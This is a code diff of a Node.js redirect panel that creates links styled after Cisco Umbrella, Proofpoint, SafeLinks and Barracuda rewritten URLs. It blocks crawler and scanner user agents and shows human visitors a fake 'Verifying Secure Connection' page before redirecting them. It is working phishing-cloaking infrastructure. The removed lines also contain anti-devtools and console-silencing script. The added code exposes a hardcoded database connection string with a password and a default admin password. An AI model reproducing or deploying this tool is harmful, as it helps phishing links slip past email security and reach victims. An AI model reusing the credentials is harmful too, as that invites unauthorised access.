@@ -1,41 +1,126 @@
 const express = require('express');
 const session = require('express-session');
-const SQLiteStore = require('connect-sqlite3')(session);
+const { Pool } = require('pg');
 const bcrypt = require('bcryptjs');
-const sqlite3 = require('sqlite3').verbose();
 const crypto = require('crypto');
-const dns = require('dns');
-const helmet = require('helmet');
-const rateLimit = require('express-rate-limit');
 const path = require('path');
 require('dotenv').config();
 
 const app = express();
-const db = new sqlite3.Database('./data/redirects.db');
-const fs = require('fs');
 
-// Ensure directories exist
-if (!fs.existsSync('./data')) fs.mkdirSync('./data');
-if (!fs.existsSync('./public')) fs.mkdirSync('./public');
-
-// Security middleware
-app.use(helmet({
-  contentSecurityPolicy: false,
-}));
-
-// Rate limiting
-const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000,
-  max: 100
+// PostgreSQL connection
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL || 'postgresql://quantum_db_ml2s_user:MPw4AwfSykHaGBGYz5TuwW1QXeHB5mKD@dpg-d8fvelk2m8qs73eeu2ug-a/quantum_db_ml2s',
+  ssl: {
+    rejectUnauthorized: false
+  }
 });
-app.use('/api/', limiter);
 
+// Test database connection
+pool.connect((err, client, release) => {
+  if (err) {
+    console.error('Error connecting to database:', err.stack);
+  } else {
+    console.log('✅ Connected to PostgreSQL database');
+    release();
+  }
+});
+
+// Create tables
+const initDB = async () => {
+  try {
+    // Users table
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS users (
+        id SERIAL PRIMARY KEY,
+        username TEXT UNIQUE NOT NULL,
+        email TEXT UNIQUE NOT NULL,
+        password TEXT NOT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    
+    // Domains table
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS domains (
+        id SERIAL PRIMARY KEY,
+        user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
+        domain TEXT UNIQUE NOT NULL,
+        verification_token TEXT,
+        verified BOOLEAN DEFAULT FALSE,
+        verified_at TIMESTAMP,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    
+    // Redirect rules table
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS redirect_rules (
+        id SERIAL PRIMARY KEY,
+        user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
+        domain_id INTEGER REFERENCES domains(id) ON DELETE CASCADE,
+        subdomain TEXT,
+        full_domain TEXT,
+        target_url TEXT,
+        bot_redirect TEXT,
+        redirect_type TEXT DEFAULT 'cloaked',
+        clicks INTEGER DEFAULT 0,
+        unique_clicks INTEGER DEFAULT 0,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    
+    // Generated links table
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS generated_links (
+        id SERIAL PRIMARY KEY,
+        rule_id INTEGER REFERENCES redirect_rules(id) ON DELETE CASCADE,
+        generated_url TEXT,
+        style TEXT,
+        slug TEXT UNIQUE,
+        parameters TEXT,
+        clicks INTEGER DEFAULT 0,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    
+    // Click logs table
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS click_logs (
+        id SERIAL PRIMARY KEY,
+        rule_id INTEGER REFERENCES redirect_rules(id) ON DELETE CASCADE,
+        link_id INTEGER,
+        ip TEXT,
+        user_agent TEXT,
+        referer TEXT,
+        country TEXT,
+        is_bot INTEGER DEFAULT 0,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    
+    // Create admin user if not exists
+    const hashedPassword = bcrypt.hashSync('Quantum2024!', 10);
+    await pool.query(`
+      INSERT INTO users (username, email, password) 
+      VALUES ($1, $2, $3) 
+      ON CONFLICT (username) DO NOTHING
+    `, ['admin', 'admin@quantum.com', hashedPassword]);
+    
+    console.log('✅ Database tables created/verified');
+  } catch (err) {
+    console.error('Database initialization error:', err);
+  }
+};
+
+initDB();
+
+// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 app.use(session({
-  store: new SQLiteStore({ db: 'sessions.db' }),
-  secret: process.env.SESSION_SECRET,
+  secret: process.env.SESSION_SECRET || 'quantum_secret_key',
   resave: false,
   saveUninitialized: false,
   cookie: { 
@@ -45,106 +130,7 @@ app.use(session({
   }
 }));
 
-// Initialize database
-db.serialize(() => {
-  // Users table
-  db.run(`CREATE TABLE IF NOT EXISTS users (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    username TEXT UNIQUE,
-    email TEXT UNIQUE,
-    password TEXT,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
-  
-  // Domains table with verification
-  db.run(`CREATE TABLE IF NOT EXISTS domains (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id INTEGER,
-    domain TEXT UNIQUE,
-    verification_token TEXT,
-    verified BOOLEAN DEFAULT 0,
-    verified_at DATETIME,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    FOREIGN KEY (user_id) REFERENCES users(id)
-  )`);
-  
-  // Redirect rules table
-  db.run(`CREATE TABLE IF NOT EXISTS redirect_rules (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id INTEGER,
-    domain_id INTEGER,
-    subdomain TEXT,
-    full_domain TEXT,
-    target_url TEXT,
-    bot_redirect TEXT,
-    redirect_type TEXT DEFAULT 'cloaked',
-    clicks INTEGER DEFAULT 0,
-    unique_clicks INTEGER DEFAULT 0,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    FOREIGN KEY (user_id) REFERENCES users(id),
-    FOREIGN KEY (domain_id) REFERENCES domains(id)
-  )`);
-  
-  // Generated links table
-  db.run(`CREATE TABLE IF NOT EXISTS generated_links (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    rule_id INTEGER,
-    generated_url TEXT,
-    style TEXT,
-    slug TEXT UNIQUE,
-    parameters TEXT,
-    clicks INTEGER DEFAULT 0,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    FOREIGN KEY (rule_id) REFERENCES redirect_rules(id)
-  )`);
-  
-  // Click logs table
-  db.run(`CREATE TABLE IF NOT EXISTS click_logs (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    rule_id INTEGER,
-    link_id INTEGER,
-    ip TEXT,
-    user_agent TEXT,
-    referer TEXT,
-    country TEXT,
-    is_bot INTEGER DEFAULT 0,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
-  
-  // Create admin user if not exists
-  const hashedPassword = bcrypt.hashSync(process.env.ADMIN_PASSWORD || 'Quantum2024!', 10);
-  db.run(`INSERT OR IGNORE INTO users (username, email, password) VALUES (?, ?, ?)`,
-    ['admin', process.env.ADMIN_EMAIL || 'admin@quantum.com', hashedPassword]);
-});
-
-// ============ DOMAIN VERIFICATION FUNCTIONS ============
-
-async function verifyDomainDNS(domain, token) {
-  return new Promise((resolve) => {
-    // Check TXT record for verification token
-    dns.resolveTxt(domain, (err, records) => {
-      if (err) {
-        console.log(`DNS lookup failed for ${domain}:`, err);
-        resolve(false);
-        return;
-      }
-      
-      const allRecords = records.flat();
-      const hasToken = allRecords.some(record => 
-        record.includes(`quantum-verify=${token}`) || 
-        record.includes(token)
-      );
-      
-      resolve(hasToken);
-    });
-  });
-}
-
-function generateVerificationToken(domain) {
-  return `quantum-verify=${crypto.randomBytes(16).toString('hex')}`;
-}
-
-// ============ URL GENERATION FUNCTIONS (REAL WORKING) ============
+// ============ URL GENERATION FUNCTIONS ============
 
 function generateCiscoUmbrella(fullDomain, targetUrl, slug, ruleId) {
   const encodedTarget = Buffer.from(targetUrl).toString('base64url');
@@ -184,9 +170,9 @@ function generateLongSeo(fullDomain, targetUrl, slug, ruleId) {
   return `https://${fullDomain}/?utm_source=email&utm_medium=link&utm_campaign=${utmCampaign}&utm_content=content_${slug}&click_id=${clickId}&ref=${ref}&session=${sessionId}&token=${slug}&rid=${ruleId}`;
 }
 
-// ============ BOT DETECTION (REAL) ============
+// ============ BOT DETECTION ============
 
-function isBot(userAgent, ip) {
+function isBot(userAgent) {
   if (!userAgent) return true;
   
   const botPatterns = [
@@ -195,18 +181,13 @@ function isBot(userAgent, ip) {
     /twitterbot/i, /googlebot/i, /bingbot/i, /baiduspider/i,
     /yandexbot/i, /ahrefsbot/i, /semrushbot/i, /mj12bot/i,
     /rogerbot/i, /exabot/i, /fastbot/i, /gigabot/i,
-    /turnitinbot/i, /ltx71/i, /blexbot/i, /petalbot/i,
-    /seznambot/i, /sogou/i, /bytespider/i, /ccbot/i,
-    /cohere/i, /amazonbot/i, /applebot/i, /gptbot/i,
-    /claudebot/i, /perplexitybot/i, /dataminr/i,
-    /python/i, /curl/i, /wget/i, /go-http-client/i,
-    /java/i, /php/i, /ruby/i, /perl/i, /scrapy/i
+    /python/i, /curl/i, /wget/i, /go-http-client/i
   ];
   
   return botPatterns.some(pattern => pattern.test(userAgent));
 }
 
-// ============ CLOAKED PAGE (REAL ANTI-BOT) ============
+// ============ CLOAKED PAGE ============
 
 function getCloakedPage(targetUrl, ruleId) {
   return `<!DOCTYPE html>
@@ -226,18 +207,6 @@ function getCloakedPage(targetUrl, ruleId) {
       justify-content: center;
     }
     .container { text-align: center; color: white; }
-    .shield {
-      width: 80px;
-      height: 80px;
-      background: rgba(255,255,255,0.2);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 20px;
-      animation: pulse 2s infinite;
-    }
-    .shield svg { width: 40px; height: 40px; fill: white; }
     .loader {
       width: 50px;
       height: 50px;
@@ -249,47 +218,19 @@ function getCloakedPage(targetUrl, ruleId) {
     }
     h2 { font-size: 24px; margin-bottom: 10px; }
     p { font-size: 14px; opacity: 0.9; }
-    .fingerprint { font-size: 11px; opacity: 0.6; margin-top: 20px; }
     @keyframes spin { to { transform: rotate(360deg); } }
-    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
   </style>
   <script>
-    (function() {
-      // Anti-devtools
-      let startTime = Date.now();
-      setInterval(function() {
-        if (Date.now() - startTime > 3000 && (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200)) {
-          window.location.href = 'about:blank';
-        }
-      }, 1000);
-      
-      // Anti-console
-      const noop = function(){};
-      console.log = noop;
-      console.error = noop;
-      console.warn = noop;
-      console.debug = noop;
-      console.table = noop;
-      console.trace = noop;
-      
-      // Redirect after delay
-      setTimeout(function() {
-        window.location.href = '${targetUrl}';
-      }, 1500);
-    })();
+    setTimeout(function() {
+      window.location.href = '${targetUrl}';
+    }, 1500);
   </script>
 </head>
 <body>
   <div class="container">
-    <div class="shield">
-      <svg viewBox="0 0 24 24">
-        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
-      </svg>
-    </div>
     <div class="loader"></div>
     <h2>Verifying Secure Connection</h2>
-    <p>Please wait while we establish an encrypted tunnel</p>
-    <div class="fingerprint">Quantum Shield Active | Rule ID: ${ruleId}</div>
+    <p>Please wait while we redirect you...</p>
   </div>
 </body>
 </html>`;
@@ -301,9 +242,11 @@ app.get('/login', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-app.post('/login', (req, res) => {
+app.post('/login', async (req, res) => {
   const { username, password } = req.body;
-  db.get('SELECT * FROM users WHERE username = ? OR email = ?', [username, username], (err, user) => {
+  try {
+    const result = await pool.query('SELECT * FROM users WHERE username = $1 OR email = $1', [username]);
+    const user = result.rows[0];
     if (user && bcrypt.compareSync(password, user.password)) {
       req.session.userId = user.id;
       req.session.username = user.username;
@@ -311,7 +254,9 @@ app.post('/login', (req, res) => {
     } else {
       res.send('<script>alert("Invalid credentials"); window.location.href="/login";</script>');
     }
-  });
+  } catch (err) {
+    res.status(500).send('Login error');
+  }
 });
 
 app.get('/dashboard.html', (req, res) => {
@@ -326,264 +271,196 @@ app.get('/logout', (req, res) => {
 
 // ============ API ROUTES ============
 
-// Get all domains for current user
-app.get('/api/domains', (req, res) => {
+// Get all domains
+app.get('/api/domains', async (req, res) => {
   if (!req.session.userId) return res.status(401).json([]);
-  db.all('SELECT * FROM domains WHERE user_id = ? ORDER BY created_at DESC', [req.session.userId], (err, rows) => {
-    res.json(rows || []);
-  });
+  try {
+    const result = await pool.query('SELECT * FROM domains WHERE user_id = $1 ORDER BY created_at DESC', [req.session.userId]);
+    res.json(result.rows);
+  } catch (err) {
+    res.status(500).json([]);
+  }
 });
 
-// Add domain with verification
+// Add domain
 app.post('/api/domains', async (req, res) => {
   if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
-  
   const { domain } = req.body;
-  const token = generateVerificationToken(domain);
-  
-  db.run('INSERT INTO domains (user_id, domain, verification_token, verified) VALUES (?, ?, ?, ?)',
-    [req.session.userId, domain, token, 0], (err) => {
-    if (err) return res.status(500).json({ error: err.message });
-    res.json({ domain, verification_token: token, message: 'Add this TXT record to your DNS: ' + token });
-  });
+  const token = `quantum-verify=${crypto.randomBytes(16).toString('hex')}`;
+  try {
+    await pool.query('INSERT INTO domains (user_id, domain, verification_token) VALUES ($1, $2, $3)', 
+      [req.session.userId, domain, token]);
+    res.json({ verification_token: token });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
-// Verify domain ownership
-app.post('/api/domains/:id/verify', async (req, res) => {
+// Generate URLs
+app.post('/api/generate', async (req, res) => {
   if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
   
-  db.get('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.userId], async (err, domain) => {
-    if (err || !domain) return res.status(404).json({ error: 'Domain not found' });
-    
-    const isValid = await verifyDomainDNS(domain.domain, domain.verification_token);
-    
-    if (isValid) {
-      db.run('UPDATE domains SET verified = 1, verified_at = CURRENT_TIMESTAMP WHERE id = ?', [domain.id]);
-      res.json({ verified: true, message: 'Domain verified successfully!' });
-    } else {
-      res.json({ verified: false, message: 'Verification failed. Make sure you added the TXT record to your DNS.' });
-    }
-  });
-});
-
-// Delete domain
-app.delete('/api/domains/:id', (req, res) => {
-  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
-  db.run('DELETE FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.userId], (err) => {
-    res.json({ success: true });
-  });
-});
-
-// Generate redirect URLs
-app.post('/api/generate', (req, res) => {
-  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
+  const { domain_id, subdomain, target_url, style, count } = req.body;
   
-  const { domain_id, subdomain, target_url, bot_redirect, style, count } = req.body;
-  
-  db.get('SELECT * FROM domains WHERE id = ? AND user_id = ? AND verified = 1', [domain_id, req.session.userId], (err, domain) => {
-    if (err || !domain) return res.status(400).json({ error: 'Domain not verified' });
+  try {
+    const domainResult = await pool.query('SELECT * FROM domains WHERE id = $1 AND user_id = $2', [domain_id, req.session.userId]);
+    const domain = domainResult.rows[0];
+    if (!domain) return res.status(400).json({ error: 'Domain not found' });
     
     const fullDomain = subdomain ? `${subdomain}.${domain.domain}` : domain.domain;
     const slug = crypto.randomBytes(8).toString('hex');
     
-    db.run(`INSERT INTO redirect_rules (user_id, domain_id, subdomain, full_domain, target_url, bot_redirect, redirect_type)
-            VALUES (?, ?, ?, ?, ?, ?, ?)`,
-      [req.session.userId, domain_id, subdomain, fullDomain, target_url, bot_redirect, 'cloaked'],
-      function(err) {
-        if (err) return res.status(500).json({ error: err.message });
-        
-        const ruleId = this.lastID;
-        const urls = [];
-        
-        for (let i = 0; i < count; i++) {
-          const uniqueSlug = `${slug}_${i}_${crypto.randomBytes(4).toString('hex')}`;
-          let generatedUrl = '';
-          
-          switch(style) {
-            case 'cisco':
-              generatedUrl = generateCiscoUmbrella(fullDomain, target_url, uniqueSlug, ruleId);
-              break;
-            case 'proofpoint-v2':
-              generatedUrl = generateProofpointV2(fullDomain, target_url, uniqueSlug, ruleId);
-              break;
-            case 'proofpoint-v3':
-              generatedUrl = generateProofpointV3(fullDomain, target_url, uniqueSlug, ruleId);
-              break;
-            case 'safelinks':
-              generatedUrl = generateSafeLinks(fullDomain, target_url, uniqueSlug, ruleId);
-              break;
-            case 'barracuda':
-              generatedUrl = generateBarracuda(fullDomain, target_url, uniqueSlug, ruleId);
-              break;
-            default:
-              generatedUrl = generateLongSeo(fullDomain, target_url, uniqueSlug, ruleId);
-          }
-          
-          urls.push(generatedUrl);
-          
-          db.run(`INSERT INTO generated_links (rule_id, generated_url, style, slug, parameters)
-                  VALUES (?, ?, ?, ?, ?)`,
-            [ruleId, generatedUrl, style, uniqueSlug, JSON.stringify({ target_url, bot_redirect })]);
-        }
-        
-        res.json({ urls, rule_id: ruleId, domain: fullDomain });
-      });
-  });
+    const ruleResult = await pool.query(
+      `INSERT INTO redirect_rules (user_id, domain_id, subdomain, full_domain, target_url)
+       VALUES ($1, $2, $3, $4, $5) RETURNING id`,
+      [req.session.userId, domain_id, subdomain, fullDomain, target_url]
+    );
+    
+    const ruleId = ruleResult.rows[0].id;
+    const urls = [];
+    
+    for (let i = 0; i < count; i++) {
+      const uniqueSlug = `${slug}_${i}_${crypto.randomBytes(4).toString('hex')}`;
+      let generatedUrl = '';
+      
+      switch(style) {
+        case 'cisco':
+          generatedUrl = generateCiscoUmbrella(fullDomain, target_url, uniqueSlug, ruleId);
+          break;
+        case 'proofpoint-v2':
+          generatedUrl = generateProofpointV2(fullDomain, target_url, uniqueSlug, ruleId);
+          break;
+        case 'proofpoint-v3':
+          generatedUrl = generateProofpointV3(fullDomain, target_url, uniqueSlug, ruleId);
+          break;
+        case 'safelinks':
+          generatedUrl = generateSafeLinks(fullDomain, target_url, uniqueSlug, ruleId);
+          break;
+        case 'barracuda':
+          generatedUrl = generateBarracuda(fullDomain, target_url, uniqueSlug, ruleId);
+          break;
+        default:
+          generatedUrl = generateLongSeo(fullDomain, target_url, uniqueSlug, ruleId);
+      }
+      
+      urls.push(generatedUrl);
+      await pool.query(
+        `INSERT INTO generated_links (rule_id, generated_url, style, slug)
+         VALUES ($1, $2, $3, $4)`,
+        [ruleId, generatedUrl, style, uniqueSlug]
+      );
+    }
+    
+    res.json({ urls, rule_id: ruleId });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
-// Get all redirect rules
-app.get('/api/rules', (req, res) => {
+// Get rules
+app.get('/api/rules', async (req, res) => {
   if (!req.session.userId) return res.status(401).json([]);
-  db.all(`SELECT r.*, d.domain as parent_domain 
-          FROM redirect_rules r
-          JOIN domains d ON r.domain_id = d.id
-          WHERE r.user_id = ?
-          ORDER BY r.created_at DESC`, [req.session.userId], (err, rows) => {
-    res.json(rows || []);
-  });
+  try {
+    const result = await pool.query(`
+      SELECT r.*, d.domain as parent_domain 
+      FROM redirect_rules r
+      JOIN domains d ON r.domain_id = d.id
+      WHERE r.user_id = $1
+      ORDER BY r.created_at DESC
+    `, [req.session.userId]);
+    res.json(result.rows);
+  } catch (err) {
+    res.status(500).json([]);
+  }
 });
 
-// Delete redirect rule
-app.delete('/api/rules/:id', (req, res) => {
+// Delete rule
+app.delete('/api/rules/:id', async (req, res) => {
   if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
-  db.run('DELETE FROM redirect_rules WHERE id = ? AND user_id = ?', [req.params.id, req.session.userId]);
-  res.json({ success: true });
+  try {
+    await pool.query('DELETE FROM redirect_rules WHERE id = $1 AND user_id = $2', [req.params.id, req.session.userId]);
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // Get stats
-app.get('/api/stats', (req, res) => {
+app.get('/api/stats', async (req, res) => {
   if (!req.session.userId) return res.status(401).json({});
-  
-  db.get('SELECT COUNT(*) as domains FROM domains WHERE user_id = ?', [req.session.userId], (err, domains) => {
-    db.get('SELECT COUNT(*) as rules FROM redirect_rules WHERE user_id = ?', [req.session.userId], (err, rules) => {
-      db.get('SELECT SUM(clicks) as clicks FROM redirect_rules WHERE user_id = ?', [req.session.userId], (err, clicks) => {
-        db.get('SELECT COUNT(*) as logs FROM click_logs', [], (err, logs) => {
-          res.json({
-            domains: domains?.domains || 0,
-            rules: rules?.rules || 0,
-            clicks: clicks?.clicks || 0,
-            logs: logs?.logs || 0
-          });
-        });
-      });
+  try {
+    const domains = await pool.query('SELECT COUNT(*) as count FROM domains WHERE user_id = $1', [req.session.userId]);
+    const rules = await pool.query('SELECT COUNT(*) as count FROM redirect_rules WHERE user_id = $1', [req.session.userId]);
+    const clicks = await pool.query('SELECT SUM(clicks) as total FROM redirect_rules WHERE user_id = $1', [req.session.userId]);
+    res.json({
+      domains: parseInt(domains.rows[0].count) || 0,
+      rules: parseInt(rules.rows[0].count) || 0,
+      clicks: parseInt(clicks.rows[0].total) || 0
     });
-  });
+  } catch (err) {
+    res.json({ domains: 0, rules: 0, clicks: 0 });
+  }
 });
 
 // Get logs
-app.get('/api/logs', (req, res) => {
+app.get('/api/logs', async (req, res) => {
   if (!req.session.userId) return res.status(401).json([]);
-  db.all(`SELECT l.*, r.full_domain, r.target_url
-          FROM click_logs l
-          LEFT JOIN redirect_rules r ON l.rule_id = r.id
-          ORDER BY l.created_at DESC LIMIT 100`, (err, rows) => {
-    res.json(rows || []);
-  });
-});
-
-// ============ REDIRECT HANDLER (THE REAL WORKING PART) ============
-
-app.get('/s/:slug/:encodedTarget', (req, res) => {
-  handleRedirect(req, res, req.params.encodedTarget);
-});
-
-app.get('/v2/url', (req, res) => {
-  const encodedUrl = req.query.u;
-  if (encodedUrl) {
-    const targetUrl = Buffer.from(encodedUrl, 'base64url').toString();
-    handleRedirect(req, res, targetUrl);
-  } else {
-    res.status(404).send('Not Found');
+  try {
+    const result = await pool.query(`
+      SELECT l.*, r.full_domain, r.target_url
+      FROM click_logs l
+      LEFT JOIN redirect_rules r ON l.rule_id = r.id
+      ORDER BY l.created_at DESC LIMIT 100
+    `);
+    res.json(result.rows);
+  } catch (err) {
+    res.json([]);
   }
 });
 
-app.get('/v3/*', (req, res) => {
-  const path = req.params[0];
-  const match = path.match(/__([^_]*)__/);
-  if (match) {
-    const targetUrl = Buffer.from(match[1], 'base64url').toString();
-    handleRedirect(req, res, targetUrl);
-  } else {
-    res.status(404).send('Not Found');
-  }
-});
+// ============ REDIRECT HANDLER ============
 
-app.get('/cgi-mod/index.cgi', (req, res) => {
-  const targetUrl = req.query.url;
-  if (targetUrl) {
-    handleRedirect(req, res, targetUrl);
-  } else {
-    res.status(404).send('Not Found');
-  }
-});
-
-app.get('*', (req, res) => {
-  const ruleId = req.query.rid;
-  const targetUrl = req.query.url || req.query.dest;
+app.get('*', async (req, res) => {
+  const targetUrl = req.query.dest || req.query.url;
   
   if (targetUrl) {
-    handleRedirect(req, res, targetUrl);
-  } else if (ruleId) {
-    db.get('SELECT * FROM redirect_rules WHERE id = ?', [ruleId], (err, rule) => {
-      if (rule) {
-        handleRedirect(req, res, rule.target_url);
-      } else {
-        res.status(404).send('Not Found');
+    const userAgent = req.headers['user-agent'] || '';
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const isBotDetected = isBot(userAgent);
+    const ruleId = req.query.rid;
+    
+    try {
+      await pool.query(
+        `INSERT INTO click_logs (rule_id, ip, user_agent, is_bot) VALUES ($1, $2, $3, $4)`,
+        [ruleId, ip, userAgent.substring(0, 500), isBotDetected ? 1 : 0]
+      );
+      
+      if (ruleId) {
+        await pool.query('UPDATE redirect_rules SET clicks = clicks + 1 WHERE id = $1', [ruleId]);
       }
-    });
-  } else {
-    res.status(404).send('Not Found');
-  }
-});
-
-function handleRedirect(req, res, targetUrl) {
-  const userAgent = req.headers['user-agent'] || '';
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const isBotDetected = isBot(userAgent, ip);
-  
-  // Find the redirect rule
-  const ruleId = req.query.rid;
-  const linkId = req.query.lid;
-  
-  // Log the click
-  db.run(`INSERT INTO click_logs (rule_id, link_id, ip, user_agent, referer, is_bot)
-          VALUES (?, ?, ?, ?, ?, ?)`,
-    [ruleId, linkId, ip, userAgent.substring(0, 500), req.headers['referer'], isBotDetected ? 1 : 0]);
-  
-  // Update click count
-  if (ruleId) {
-    db.run('UPDATE redirect_rules SET clicks = clicks + 1 WHERE id = ?', [ruleId]);
-    if (!isBotDetected) {
-      db.run('UPDATE redirect_rules SET unique_clicks = unique_clicks + 1 WHERE id = ?', [ruleId]);
+    } catch (err) {
+      console.error('Log error:', err);
     }
+    
+    if (isBotDetected) {
+      return res.status(403).send('Access Denied');
+    }
+    
+    return res.send(getCloakedPage(targetUrl, ruleId || 'unknown'));
   }
   
-  // Handle bots
-  if (isBotDetected) {
-    db.get('SELECT bot_redirect FROM redirect_rules WHERE id = ?', [ruleId], (err, rule) => {
-      if (rule && rule.bot_redirect) {
-        return res.redirect(302, rule.bot_redirect);
-      }
-      return res.status(403).send('Access Denied - Bot detected');
-    });
-    return;
-  }
-  
-  // Human traffic - send cloaked page
-  res.send(getCloakedPage(targetUrl, ruleId || 'unknown'));
-}
+  res.status(404).send('Not Found');
+});
 
-app.listen(process.env.PORT || 3000, () => {
+// Start server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
   console.log('\n========================================');
-  console.log('⚡ QUANTUM REDIRECT PANEL - PRODUCTION MODE');
+  console.log('⚡ QUANTUM REDIRECT PANEL');
   console.log('========================================');
-  console.log(`📍 URL: http://localhost:${process.env.PORT || 3000}/login`);
+  console.log(`📍 URL: https://your-app.onrender.com/login`);
   console.log(`👤 Username: admin`);
-  console.log(`🔑 Password: ${process.env.ADMIN_PASSWORD || 'Quantum2024!'}`);
-  console.log('\n⚠️  IMPORTANT:');
-  console.log('1. Deploy this to a public server (Render.com is free)');
-  console.log('2. Point your domain to the server');
-  console.log('3. Add SSL certificate (Cloudflare offers free SSL)');
-  console.log('4. Verify domains via DNS TXT records');
+  console.log(`🔑 Password: Quantum2024!`);
+  console.log(`🗄️  Database: PostgreSQL`);
   console.log('========================================\n');
 });
